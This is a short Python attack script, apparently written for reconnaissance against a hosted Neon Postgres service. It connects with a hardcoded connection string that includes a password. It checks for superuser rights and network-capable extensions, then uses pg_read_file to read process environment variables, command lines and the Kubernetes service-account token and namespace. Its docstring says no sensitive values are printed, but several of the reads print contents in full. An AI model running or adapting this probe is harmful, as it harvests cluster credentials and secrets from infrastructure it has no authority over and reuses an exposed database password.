# -*- coding: utf-8 -*-
"""数据库面新链侦察:文件读取能力 + 高价值文件探测
只提取变量名/长度,不打印敏感值。无网络阻塞操作。"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

# 1. 基本身份与文件读权限
print('current_user:', q('SELECT current_user'))
print('is_superuser:', q('SHOW is_superuser'))
print('config_file:', q('SHOW config_file'))
print('data_dir:', q('SHOW data_directory'))
print('extensions:', q("SELECT extname FROM pg_extension ORDER BY 1"))
print('avail net ext:', q("SELECT name FROM pg_available_extensions WHERE name IN ('dblink','pg_net','http','plpython3u','pg_curl','pgsql-http','file_fdw','postgres_fdw') ORDER BY 1"))

# 2. pg_read_file 直接测试(neondb_owner)
print('read /etc/hostname:', q("SELECT pg_read_file('/etc/hostname')"))
print('read /proc/1/cmdline:', q("SELECT pg_read_file('/proc/1/cmdline')"))
print('read /proc/self/environ:', q("SELECT pg_read_file('/proc/self/environ')"))
print('read /proc/self/cmdline:', q("SELECT pg_read_file('/proc/self/cmdline')"))
print('read k8s token:', q("SELECT length(pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/token'))"))
print('read k8s ns:', q("SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/namespace')"))

conn.close()
